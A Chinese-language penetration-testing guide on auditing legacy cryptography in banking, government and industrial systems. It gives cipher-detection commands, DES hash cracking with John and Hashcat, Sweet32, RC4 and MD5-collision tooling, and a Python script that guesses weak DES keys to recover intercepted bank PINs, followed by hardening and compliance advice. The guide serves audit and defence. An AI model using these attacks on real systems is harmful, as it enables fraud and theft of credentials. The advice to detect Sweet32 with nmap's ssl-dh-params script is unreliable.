# 传统加密审计

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供传统/遗留加密系统的审计方法论。通过本指南，测试人员可以识别和评估金融、政府等行业中仍在使用传统加密算法（如 DES、3DES、RC4）的系统安全风险。

### 1.2 适用范围
本文档适用于以下场景：
- 传统金融系统（银行核心系统、支付系统）
- 政府机构遗留系统
- 医疗信息系统（HIPAA 合规系统）
- 工业控制系统（SCADA）
- 任何使用 2010 年前加密技术的系统

### 1.3 读者对象
- 渗透测试工程师
- 合规性审计人员
- 遗留系统安全评估人员
- 金融行业安全测试人员

---

## 第二部分：核心渗透技术专题

### 专题一：传统加密审计

#### 2.1 技术介绍

**传统加密审计**是针对使用过时加密算法和协议的系统进行的安全性评估。这些系统由于兼容性、成本或业务连续性原因，仍在使用已被证明不安全的加密技术。

**常见传统加密算法风险：**

| 算法 | 首次发布 | 当前状态 | 主要漏洞 |
|------|---------|---------|---------|
| DES | 1977 | ❌ 已破解 | 56 位密钥过短 |
| 3DES | 1999 | ⚠️ 已弃用 | Sweet32 攻击 |
| RC4 | 1987 | ❌ 已破解 | 统计偏差 |
| MD5 | 1992 | ❌ 已破解 | 碰撞攻击 |
| SHA1 | 1995 | ❌ 已破解 | 碰撞攻击 |
| RSA-1024 | 1991 | ⚠️ 不安全 | 密钥长度不足 |

#### 2.2 审计常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 银行核心系统 | 账户管理、转账 | 使用 DES/3DES 加密 PIN 码 |
| 支付终端 | POS 机、ATM | 传统加密算法保护交易数据 |
| 社保卡系统 | 医保卡、身份证 | 使用国产传统加密算法 |
| 电力 SCADA | 远程控制、数据采集 | 专有加密协议 |
| 航空订票 | GDS 系统 | 遗留加密实现 |
| 海关系统 | 报关、查验 | 传统数据加密 |

#### 2.3 漏洞检测方法

##### 2.3.1 加密算法识别

```bash
# 使用 Nmap 识别服务加密
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-cert -p 443 target.com

# 检测 SSL/TLS 加密套件
nmap --script ssl-enum-ciphers --script-args ssl-enum-ciphers.show-weak-ciphers -p 443 target.com

# 使用 OpenSSL 测试
openssl s_client -connect target.com:443 -cipher 'DES'
openssl s_client -connect target.com:443 -cipher 'RC4'
openssl s_client -connect target.com:443 -cipher '3DES'
```

##### 2.3.2 数据库加密检测

```sql
-- 检测 SQL Server 加密配置
SELECT name, is_encrypted FROM sys.databases;

-- 检测 Oracle 加密
SELECT * FROM V$ENCRYPTED_TABLESPACES;

-- 检测 MySQL 加密
SHOW VARIABLES LIKE '%encrypt%';

-- 查找可能的弱加密字段
-- 16 字符可能是 DES/3DES
-- 32 字符可能是 MD5
SELECT column_name, data_type, character_maximum_length 
FROM information_schema.columns 
WHERE table_schema = 'target_db'
AND (character_maximum_length IN (16, 32, 40));
```

##### 2.3.3 文件系统加密检测

```bash
# 查找加密文件
find /path -name "*.gpg" -o -name "*.pgp" -o -name "*.enc"

# 检查文件熵值（高熵可能是加密或压缩）
ent sensitive_file.dat

# 检查文件系统级加密
# Windows EFS
cipher /c /s:C:\sensitive_folder

# Linux eCryptfs
mount | grep ecryptfs
```

#### 2.4 漏洞利用方法

##### 2.4.1 DES 破解

```bash
# DES 哈希格式
# username:password_hash:uid:gid:gecos:home:shell
# 示例：user:ABCdef123456:1000:1000::/home/user:/bin/bash

# 使用 John the Ripper 破解
john --format=des shadow_file

# 使用 Hashcat
hashcat -m 1500 hashes.txt wordlist.txt

# DES 由于密钥短（56 位），可快速破解
# 现代 GPU 每秒可尝试数亿次 DES
```

##### 2.4.2 3DES Sweet32 攻击

```bash
# 检测 Sweet32 漏洞
nmap --script ssl-dh-params -p 443 target.com

# 使用 Sweet32 专用工具
git clone https://github.com/KarimSadek/Sweet32.git
cd Sweet32
python3 sweet32.py target.com 443

# 如果存在漏洞，可通过收集大量密文
# 利用生日悖论产生碰撞，解密部分数据
```

##### 2.4.3 RC4 攻击

```bash
# 检测 RC4 支持
openssl s_client -connect target.com:443 -cipher 'RC4'

# 如果连接成功，说明支持 RC4
# RC4 存在统计偏差，可通过分析大量密文
# 恢复部分明文（如 Cookie、认证令牌）

# 使用 RC4 攻击工具
git clone https://github.com/RC4bias/rc4bias.git
```

##### 2.4.4 MD5 碰撞利用

```bash
# MD5 碰撞生成
# 使用 fastcoll 工具生成两个不同但 MD5 相同的文件

git clone https://github.com/corkami/collisions.git
cd collisions
make
./fastcoll -p prefix -o coll1.bin coll2.bin

# 验证 MD5 相同
md5sum coll1.bin coll2.bin

# 可用于伪造证书、签名等
```

##### 2.4.5 传统金融系统 PIN 加密攻击

```python
#!/usr/bin/env python3
"""
银行 PIN 码加密攻击示例
传统系统使用 DES/3DES 加密 PIN
"""
from pyDes import des, CBC, TDES

def attack_pin_encryption():
    """
    攻击传统 PIN 加密
    """
    # 假设截获的加密 PIN
    encrypted_pin = bytes.fromhex("A1B2C3D4E5F67890")
    
    # 传统系统常用密钥
    common_keys = [
        b'\x00' * 8,  # 全零密钥
        b'12345678',
        b'87654321',
        b'ABCDEFGH',
    ]
    
    for key in common_keys:
        try:
            # DES 解密
            k = des(key, CBC, b'\x00' * 8)
            decrypted = k.decrypt(encrypted_pin)
            
            # 检查是否为有效 PIN（4-6 位数字）
            pin = decrypted.decode('ascii', errors='ignore')
            if pin.isdigit() and 4 <= len(pin) <= 6:
                print(f"[+] 找到 PIN: {pin}")
                print(f"    密钥：{key}")
                return pin
        except:
            continue
    
    print("[-] 未找到有效 PIN")
    return None

# 3DES PIN 攻击类似，使用 TDES
```

#### 2.5 加固建议

##### 2.5.1 算法迁移路径

| 当前算法 | 推荐迁移目标 | 优先级 |
|---------|------------|--------|
| DES | AES-256 | 紧急 |
| 3DES | AES-256 | 高 |
| RC4 | AES-GCM | 紧急 |
| MD5 | SHA-256/SHA-3 | 紧急 |
| SHA1 | SHA-256/SHA-3 | 高 |
| RSA-1024 | RSA-3072+ 或 ECDSA | 高 |

##### 2.5.2 金融系统加密加固

```
1. PIN 加密迁移
   - 从 DES/3DES 迁移到 AES-256
   - 使用 HSM 保护密钥
   - 实施密钥轮换

2. 传输加密
   - 禁用 SSL 3.0、TLS 1.0、TLS 1.1
   - 仅使用 TLS 1.2+ 和强加密套件
   - 实施双向证书认证

3. 数据加密
   - 敏感数据使用 AES-256-GCM
   - 实施字段级加密
   - 密钥与数据分离存储
```

---

## 第三部分：附录

### 3.1 传统加密检测清单

- [ ] 检测 DES/3DES 加密
- [ ] 检测 RC4 加密
- [ ] 检测 MD5 哈希
- [ ] 检测 SHA1 哈希/签名
- [ ] 检测 RSA-1024 密钥
- [ ] 检测 SSL 3.0、TLS 1.0、TLS 1.1
- [ ] 检测导出级加密（EXPORT）
- [ ] 检测弱 DH 参数（<1024 位）

### 3.2 合规性要求参考

| 标准 | 加密要求 |
|------|---------|
| PCI DSS 3.2.1 | 禁用 SSL 3.0、TLS 1.0；3DES 有限使用 |
| PCI DSS 4.0 | 仅 TLS 1.2+；强加密 |
| NIST SP 800-131A | 禁用 DES、3DES（2023 后） |
| HIPAA | 加密 PHI，推荐 AES-256 |
| FIPS 140-2 | 批准的算法列表 |

### 3.3 传统系统加固优先级

```
紧急（立即处理）：
- 互联网暴露的 DES/RC4 服务
- 使用 MD5 的认证系统
- SSL 3.0、TLS 1.0 服务

高（30 天内）：
- 内部 3DES 系统
- SHA1 证书签名
- RSA-1024 密钥

中（90 天内）：
- 非关键系统的传统加密
- 有补偿性控制的遗留系统
```

---

## 参考资源

- [NIST SP 800-131A Rev. 2](https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final)
- [PCI DSS Encryption Requirements](https://docs-prv.pcisecuritystandards.org/PCI%20DSS/Standard/PCI-DSS-v3_2_1.pdf)
- [Sweet32 Attack](https://sweet32.info/)
- [RFC 7465 - Prohibiting RC4](https://tools.ietf.org/html/rfc7465)
- [RFC 6176 - Prohibiting SSL 2.0](https://tools.ietf.org/html/rfc6176)
